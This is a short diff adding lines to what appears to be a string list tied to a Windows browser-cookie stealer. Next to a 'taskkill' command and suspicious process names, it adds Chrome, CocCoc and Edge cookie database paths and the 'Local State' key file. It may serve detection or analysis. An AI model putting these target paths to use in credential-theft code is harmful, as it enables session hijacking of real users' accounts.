@@ -7,3 +7,17 @@ rename
 taskkill /f /im 
 WindowsScanner.exe
 Win32SupportProduct.exe
+APPDATA
+\\..\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies
+\\..\\Local\\Google\\Chrome\\User Data\\Profile 
+\\..\\Local\\CocCoc\\Browser\\User Data\\Default\\Network\\Cookies
+\\..\\Local\\CocCoc\\Browser\\User Data\\Profile 
+\\..\\Local\\CocCoc\\Browser\\User Data\\Default\\Cookies
+\\..\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies
+\\..\\Local\\Microsoft\\Edge\\User Data\\Profile 
+\\Network\\Cookies
+\\Cookies
+USERPROFILE|AppData|Local|User Data|Local State
+CocCoc|Browser
+Google|Chrome
+Microsoft|Edge
